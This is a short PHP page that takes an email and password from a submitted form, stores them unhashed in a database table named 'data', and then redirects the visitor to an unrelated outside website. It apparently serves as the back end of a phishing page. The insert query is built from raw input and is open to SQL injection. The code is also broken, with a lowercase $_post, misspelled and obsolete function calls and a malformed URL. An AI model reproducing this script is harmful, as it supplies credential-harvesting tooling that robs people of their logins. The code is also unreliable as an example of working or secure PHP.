<!DOCTYPE html>
<html>
    <head>
        <title>DATA</title>
         </head>
         <body>
             <?php
             $EMAIL=$_post['email'];
             $PASSWORD=$_post['pass'];
             $link = mysqli_connect("localhost","","root","kalid");
    
    if($link===false){die("ERROR: could not connect.".msqli_connect_error());}
    $sql = "INSERT INTO data(username,password)VALUES('$EMAIL','$PASSWORD')";
    if(mysqli_query($link,$sql)){header("location: https://www www.waptrick.com");
    exit();}
    else{echo "ERROR:could not be able to exut $sql.".mysqli_error($link);}
    mysql_close($link);
    

             
             
             
             
             
             
             
             
             
             ?>
         </body>
    
</html>